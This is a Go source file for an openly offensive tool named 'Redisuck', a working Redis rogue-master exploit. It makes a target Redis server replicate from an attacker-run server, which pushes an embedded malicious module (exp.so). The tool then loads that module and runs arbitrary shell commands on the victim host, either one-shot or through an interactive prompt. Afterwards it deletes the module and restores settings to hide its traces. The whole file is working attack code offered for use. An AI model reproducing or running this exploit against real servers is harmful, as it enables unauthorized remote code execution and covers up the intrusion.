package main

import (
	"bufio"
	"bytes"
	_ "embed"
	"flag"
	"fmt"
	"log/slog"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
)

//go:embed exp.so
var exp []byte

func main() {
	rhost := flag.String("rhost", "", "Redis host")
	rport := flag.String("rport", "6379", "Redis port")
	password := flag.String("password", "", "Redis password")
	lhost := flag.String("lhost", "localhost", "Local host")
	lport := flag.String("lport", "6379", "Local port")
	bind := flag.String("bind", "0.0.0.0", "Bind address")
	cmd := flag.String("cmd", "", "One-shot command to execute")
	flag.Parse()

	if *rhost == "" {
		flag.Usage()
		return
	}

	slog.Info("Redisuck started at", "host", *bind, "port", *lport)
	go func() {
		err := RogueServer(*bind, *lport)
		if err != nil {
			slog.Error("Rogue server failed", err)
			os.Exit(1)
		}
	}()
	slog.Info("Redisuck will connect to", "host", *rhost, "port", *rport)
	client, err := Connect(*rhost, *rport)
	if err != nil {
		slog.Error("Failed to connect to", "host", *rhost, "port", *rport, "error", err)
		os.Exit(1)
	}
	defer client.Close()
	if *password != "" {
		//TODO Check if AUTH succeeded
		_, err := client.Do(client.MakeSpaceCommand("AUTH " + *password))
		if err != nil {
			slog.Error("Failed to authenticate", "error", err)
			os.Exit(1)
		}
	}
	_, err = client.Do(client.MakeSpaceCommand("SLAVEOF " + *lhost + " " + *lport))
	dbfilenameRsp, err := client.Do(client.MakeSpaceCommand("CONFIG GET dbfilename"))
	if err != nil {
		slog.Error("Failed to get dbfilename", "error", err)
		os.Exit(1)
	}
	splitRsp := strings.Split(string(dbfilenameRsp), "\r\n")
	dbfilename := splitRsp[len(splitRsp)-2]
	dbdirRsp, err := client.Do(client.MakeSpaceCommand("CONFIG GET dir"))
	if err != nil {
		slog.Error("Failed to get dir", "error", err)
		os.Exit(1)
	}
	splitRsp = strings.Split(string(dbdirRsp), "\r\n")
	dbdir := splitRsp[len(splitRsp)-2]
	_, err = client.Do(client.MakeSpaceCommand("CONFIG SET dbfilename " + "exp.so"))
	if err != nil {
		slog.Error("Failed to set dbfilename", "error", err)
		os.Exit(1)
	}
	//TODO Use channel to notify client back conn
	time.Sleep(4 * time.Second)
	_, err = client.Do(client.MakeSpaceCommand("MODULE LOAD " + dbdir + "/exp.so"))
	if err != nil {
		slog.Error("Failed to load module", "error", err)
		os.Exit(1)
	}
	if *cmd != "" {
		slog.Info("Sending command: ", *cmd)
		rsp, err := client.Do(client.SystemCommand(*cmd))
		if err != nil {
			slog.Error("Failed to execute command", "error", err)
		}
		slog.Debug("Command response", "response", rsp)
		fmt.Println(ParseResponse(rsp))
	} else {
		client.Interactive()
	}

	// Clean up
	_, err = client.Do(client.MakeSpaceCommand("CONFIG SET dbfilename " + dbfilename))
	if err != nil {
		slog.Error("Failed to set dbfilename back", "error", err)
		os.Exit(1)
	}
	_, err = client.Do(client.SystemCommand("rm " + dbdir + "/exp.so"))
	if err != nil {
		slog.Error("Failed to clean evil module", "error", err)
	}
	_, err = client.Do(client.MakeSpaceCommand("MODULE UNLOAD system"))
	if err != nil {
		slog.Error("Failed to unload module", "error", err)
	}
	_, err = client.Do(client.MakeSpaceCommand("SLAVEOF NO ONE"))
	if err != nil {
		slog.Error("Failed to stop replication", "error", err)
	}

}

type Client struct {
	Host string
	Port string
	Conn net.Conn
}

func Connect(host string, port string) (*Client, error) {
	conn, err := net.Dial("tcp", host+":"+port)
	if err != nil {
		return nil, err
	}
	return &Client{Host: host, Port: port, Conn: conn}, nil
}

func (c *Client) Close() error {
	return c.Conn.Close()
}

func (c *Client) Do(req []byte) ([]byte, error) {
	nWrite, err := c.Conn.Write(req)
	if err != nil {
		slog.Error("CLIENT Failed to read", "host", c.Host, "port", c.Port, "error", err)
		return nil, err
	}
	if nWrite < 80 {
		slog.Debug("CLIENT SEND", "bytes", nWrite, "data", string(req[:nWrite]))
	} else {
		slog.Debug("CLIENT SEND", "bytes", nWrite, "data", string(req[:80]))
	}
	buf := make([]byte, 65535)
	nRead, err := c.Conn.Read(buf)
	if err != nil {
		slog.Error("CLIENT Failed to read", "host", c.Host, "port", c.Port, "error", err)
		return nil, err
	}
	if nRead < 80 {
		slog.Debug("CLIENT RECV", "bytes", nRead, "data", string(buf[:nRead]))
	} else {
		slog.Debug("CLIENT RECV", "bytes", nRead, "data", string(buf[:80]))
	}
	return buf[:nRead], nil
}

func (c *Client) MakeCommand(args []string) []byte {

	command := "*" + strconv.Itoa(len(args)) + "\r\n"
	for _, arg := range args {
		command += "$" + strconv.Itoa(len(arg)) + "\r\n" + arg + "\r\n"
	}
	return []byte(command)
}

func (c *Client) MakeSpaceCommand(command string) []byte {
	return c.MakeCommand(strings.Split(command, " "))
}

func (c *Client) SystemCommand(command string) []byte {
	return []byte(c.MakeCommand([]string{"system.exec", command}))
}

func (c *Client) Interactive() {
	//TODO Interactive
	kbdInterrupt := make(chan os.Signal, 1)
	signal.Notify(kbdInterrupt,
		syscall.SIGINT,
	)
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Printf("[%s:%s]> ", c.Host, c.Port)
	go func() {
		for {
			sig := <-kbdInterrupt
			switch sig {
			case syscall.SIGINT:
				fmt.Println("Enter \"exit\" to exit")
				fmt.Printf("[%s:%s]> ", c.Host, c.Port)
			}
		}
	}()
	for scanner.Scan() {
		text := scanner.Text()
		if strings.Trim(text, " ") == "exit" {
			fmt.Println("Bye!")
			break
		}
		rsp, err := c.Do(c.SystemCommand(text))
		if err != nil {
			slog.Error("Failed to execute command", "error", err)
		}
		fmt.Println(ParseResponse(rsp))
		fmt.Printf("[%s:%s]> ", c.Host, c.Port)
	}

	if err := scanner.Err(); err != nil {
		slog.Error("Failed to read from stdin", "error", err)
	}
	return
}

func ParseResponse(rsp []byte) string {
	rspArr := bytes.Split(rsp, []byte("\r\n"))
	if len(rspArr) < 2 {
		return "(null)"
	}
	rspContent := bytes.Join(rspArr[1:len(rspArr)-1], []byte("\n"))
	return string(rspContent)
}

//TODO OOP

func RogueServer(bind string, port string) error {
	listener, err := net.Listen("tcp", bind+":"+port)
	if err != nil {
		return err
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			slog.Error("Failed to accept connection", "error", err)
			continue
		}
		go HandleConnection(conn)
	}
}

type RESPState int

const (
	RESPReady    RESPState = 0
	RESPPing               = 10
	RESPAuth               = 20
	RESPREPLConf           = 30
	RESPSync               = 100
)

func HandleRESP(data []byte, state RESPState) (resp []byte, finalState RESPState) {
	//TODO There seems to be some cringe w/ the state machine
	// switch state {
	// }
	// return []byte("-ERR\r\n"), RESPReady
	state = RESPReady
	var rsp []byte
	if bytes.Contains(data, []byte("PING")) {
		rsp = []byte("+PONG\r\n")
		state = RESPPing
	} else if bytes.Contains(data, []byte("AUTH")) {
		rsp = []byte("+OK\r\n")
		state = RESPAuth
	} else if bytes.Contains(data, []byte("REPLCONF")) {
		rsp = []byte("+OK\r\n")
		state = RESPREPLConf
	} else if bytes.Contains(data, []byte("SYNC")) || bytes.Contains(data, []byte("PSYNC")) {
		rsp = []byte("+FULLRESYNC " + strings.Repeat("Z", 40) + " 1\r\n")
		rsp = append(rsp, []byte("$"+strconv.Itoa(len(exp))+"\r\n")...)
		rsp = append(rsp, exp...)
		rsp = append(rsp, []byte("\r\n")...)
		state = RESPSync
	}
	return rsp, state
}

func HandleConnection(conn net.Conn) {
	defer conn.Close()

	state := RESPReady
	for {
		buf := make([]byte, 1024)
		nRead, err := conn.Read(buf)
		if err != nil {
			slog.Error("Failed to read", "remote", conn.RemoteAddr().String(), err)
			break
		}
		if nRead == 0 {
			break
		}
		if nRead > 80 {
			nRead = 80
		}
		slog.Debug("RECV", "bytes", nRead, "remote", conn.RemoteAddr().String(), "data", string(buf[:nRead]))
		resp, state := HandleRESP(buf, state)
		nWrite, err := conn.Write(resp)
		if err != nil {
			slog.Error("Failed to write", "remote", conn.RemoteAddr().String(), err)
			return
		}
		if nWrite > 80 {
			nWrite = 80
		}
		slog.Debug("SEND", "bytes", nWrite, "remote", conn.RemoteAddr().String(), "data", string(resp[:nWrite]))
		if state == RESPSync {
			break
		}
	}
}
